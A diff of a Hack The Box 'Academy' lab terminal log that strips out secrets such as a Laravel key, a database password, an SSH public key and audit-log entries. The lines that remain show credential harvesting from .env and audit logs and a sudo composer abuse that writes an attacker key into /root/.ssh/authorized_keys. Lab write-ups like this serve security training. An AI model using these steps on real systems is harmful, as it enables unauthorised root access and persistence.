@@ -421,7 +421,6 @@ www-data@academy:/var/www/html/academy$ cat .env
 cat .env
 APP_NAME=Laravel
 APP_ENV=local
-APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
 APP_DEBUG=false
 APP_URL=http://localhost
 
@@ -432,7 +431,6 @@ DB_HOST=127.0.0.1
 DB_PORT=3306
 DB_DATABASE=academy
 DB_USERNAME=dev
-DB_PASSWORD=mySup3rP4s5w0rd!!
 
 BROADCAST_DRIVER=log
 CACHE_DRIVER=file
@@ -497,22 +495,7 @@ Enter passphrase (empty for no passphrase):
 Enter same passphrase again: 
 Your identification has been saved in id_rsa.
 Your public key has been saved in id_rsa.pub.
-The key fingerprint is:
-SHA256:K87FeJdrLcaIQNzuOrpdMZW+kxHccuCr8k2FRsgOCjM root@kali
-The key's randomart image is:
-+---[RSA 3072]----+
-|        .        |
-|     . + +       |
-|E  ...o O o      |
-| + .oo.+ *       |
-|  .. .+ S .      |
-|    . .B * .     |
-|    .o=.Xoo.     |
-|   ..*o*.o=..    |
-|  oooo+ .o..     |
-+----[SHA256]-----+
 root@kali:~/Downloads# cat id_rsa.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHDtcwXVWCIoOxdRweBiZOs0z4v/CJpCpLlr/5ZdiMFsvXrsp67f3xfi/dYK18PzcP7XbYL0IhXlXYfHqLslZIuyQ6Ttt1Y3RQes4ukvgQQN5qnSRfg/5oaz91SGavtL0y+6p3f+EI0x/qbKBF7irakl1IUoL+3H8c223hdu05Ir3bOHn6oL9Ip41SgRZGSK17Uv4RlgJTKc1Ie8zJKLq00PAllcKCyHatqaC8eq4NVraZVOuy0PI4RwqyL4CLU9jG+ZUXcwZupd4jLfQhplJnSVNN1iv5DZs4mHjp91p7YoVfbkJXP8zZFb60Q9Fn/ro782VojqIA8BSc5YD9YkHiOkS7NXpJXfIcNknjNSRxACt0iY7f25iNriDXcb7uLUTr9+swtYpg0HYg/q6iI38YXLfSxJOMRT2Fzot3YUfi/d5peIxOKmTciUk6jpKB5MyEwz6mxgFjci3fqVZl6Ssu0nUbKcZ1YDqeZvUABT32hXk/Wo8vzDY7FQYLKzHfu70= root@kali
 root@kali:~/Downloads# 
 
 
@@ -525,31 +508,6 @@ ECDSA key fingerprint is SHA256:4v7BvR4VfuEwrmXljKvXmF+JjLCgP/46G78oNEHzt2c.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'academy.htb,10.10.10.215' (ECDSA) to the list of known hosts.
 cry0l1t3@academy.htb's password: 
-Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed 11 Nov 2020 01:29:58 AM UTC
-
-  System load:             0.0
-  Usage of /:              44.4% of 15.68GB
-  Memory usage:            15%
-  Swap usage:              0%
-  Processes:               173
-  Users logged in:         0
-  IPv4 address for ens160: 10.10.10.215
-  IPv6 address for ens160: dead:beef::250:56ff:feb9:4914
-
- * Introducing self-healing high availability clustering for MicroK8s!
-   Super simple, hardened and opinionated Kubernetes for production.
-
-     https://microk8s.io/high-availability
-
-0 updates can be installed immediately.
-0 of these updates are security updates.
-
 
 Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
 $ 
@@ -575,29 +533,6 @@ $ cd /var/log/audit
 $ ls
 audit.log  audit.log.1	audit.log.2  audit.log.3
 $ cat audit.log.3 | grep "uid=1002" | more
-type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=
-4 minor=1 comm="sh" data=7375206D7262336E0A
-type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=
-4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
-type=USER_AUTH msg=audit(1597199304.778:85): pid=2520 uid=1002 auid=0 ses=1 msg=
-'op=PAM:authentication grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su
-" hostname=academy addr=? terminal=tty1 res=success'
-type=USER_ACCT msg=audit(1597199304.778:86): pid=2520 uid=1002 auid=0 ses=1 msg=
-'op=PAM:accounting grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=a
-cademy addr=? terminal=tty1 res=success'
-type=CRED_ACQ msg=audit(1597199304.778:87): pid=2520 uid=1002 auid=0 ses=1 msg='
-op=PAM:setcred grantors=pam_permit,pam_cap acct="mrb3n" exe="/usr/bin/su" hostna
-me=academy addr=? terminal=tty1 res=success'
-type=USER_START msg=audit(1597199304.778:88): pid=2520 uid=1002 auid=0 ses=1 msg
-='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit
-,pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostna
-me=academy addr=? terminal=tty1 res=success'
-type=USER_END msg=audit(1597199317.622:91): pid=2520 uid=1002 auid=0 ses=1 msg='
-op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_tty_audit,
-pam_permit,pam_umask,pam_unix,pam_systemd acct="mrb3n" exe="/usr/bin/su" hostnam
-e=academy addr=? terminal=tty1 res=success'
-type=CRED_DISP msg=audit(1597199317.622:92): pid=2520 uid=1002 auid=0 ses=1 msg=
-'op=PAM:setcred grantors=pam_permit acct="mrb3n" exe="/usr/bin/su" hostname=acad
 $ su mrb3n
 Password: 
 $ ls
@@ -615,13 +550,8 @@ User mrb3n may run the following commands on academy:
 $ cd ~
 $ ls
 $ nnao composer.json
-sh: 6: nnao: not found
 $ nano composer.json
-$ sudo composer run-script command
-PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
-PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
-Do not run Composer as root/super user! See https://getcomposer.org/root for details
-> mkdir /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHDtcwXVWCIoOxdRweBiZOs0z4v/CJpCpLlr/5ZdiMFsvXrsp67f3xfi/dYK18PzcP7XbYL0IhXlXYfHqLslZIuyQ6Ttt1Y3RQes4ukvgQQN5qnSRfg/5oaz91SGavtL0y+6p3f+EI0x/qbKBF7irakl1IUoL+3H8c223hdu05Ir3bOHn6oL9Ip41SgRZGSK17Uv4RlgJTKc1Ie8zJKLq00PAllcKCyHatqaC8eq4NVraZVOuy0PI4RwqyL4CLU9jG+ZUXcwZupd4jLfQhplJnSVNN1iv5DZs4mHjp91p7YoVfbkJXP8zZFb60Q9Fn/ro782VojqIA8BSc5YD9YkHiOkS7NXpJXfIcNknjNSRxACt0iY7f25iNriDXcb7uLUTr9+swtYpg0HYg/q6iI38YXLfSxJOMRT2Fzot3YUfi/d5peIxOKmTciUk6jpKB5MyEwz6mxgFjci3fqVZl6Ssu0nUbKcZ1YDqeZvUABT32hXk/Wo8vzDY7FQYLKzHfu70=' >> /root/.ssh/authorized_keys
+$ sudo composer run-script command> mkdir /root/.ssh; echo 'ssh-rsa kry' >> /root/.ssh/authorized_keys
 mkdir: cannot create directory ‘/root/.ssh’: File exists
 $ ls      
 composer.json
@@ -641,14 +571,8 @@ total 0
 $ cd ~
 $ ls
 $ 
-$ 
-$ 
-$ 
 $ whoami
 mrb3n
-$ 
-$ 
-$ 
 $ 
 $ exit
 You have stopped jobs.
@@ -656,34 +580,7 @@ $ exit
 Received SIGHUP or SIGTERM
 $ exit
 Connection to academy.htb closed.
-root@kali:~/Downloads# ssh -i id_rsa root@academy.htb 
-Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed 11 Nov 2020 01:50:10 AM UTC
-
-  System load:             0.0
-  Usage of /:              44.4% of 15.68GB
-  Memory usage:            15%
-  Swap usage:              0%
-  Processes:               172
-  Users logged in:         0
-  IPv4 address for ens160: 10.10.10.215
-  IPv6 address for ens160: dead:beef::250:56ff:feb9:4914
-
- * Introducing self-healing high availability clustering for MicroK8s!
-   Super simple, hardened and opinionated Kubernetes for production.
-
-     https://microk8s.io/high-availability
-
-0 updates can be installed immediately.
-0 of these updates are security updates.
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
+root@kali:~/Downloads# ssh -i id_rsa root@academy.htb
 
 Last login: Mon Nov  9 10:11:49 2020
 root@academy:~# ls
